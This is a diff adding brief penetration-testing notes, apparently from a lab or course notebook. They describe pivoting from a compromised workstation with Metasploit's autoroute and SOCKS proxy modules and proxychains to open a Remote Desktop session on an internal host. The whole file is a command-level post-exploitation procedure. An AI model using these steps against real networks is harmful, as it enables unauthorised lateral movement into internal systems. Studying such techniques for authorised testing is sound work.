@@ -1,1 +1,21 @@
+# if we have compromised an internal workstation we will not be able to obtain a Remote Desktop session on that system even if we have the clear text credentials.
+
+# To do this we will use meterpreter and create a tunne through it 
+
+msf>  get the session using our payload
+msf> use multi/manage/autoroute
+msf> set session 1
+msf> exploit
+
+msf> use auxiliary/server/socks4a
+msf> set srvhost 127.0.0.1
+msf> exploit -j
+
+# Change the proxychains configuration
+
+kali> sudo bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'
+kali> proxychains rdesktop 192.168.120.10
+
+We gor RDP of the internal newtwork
+
 
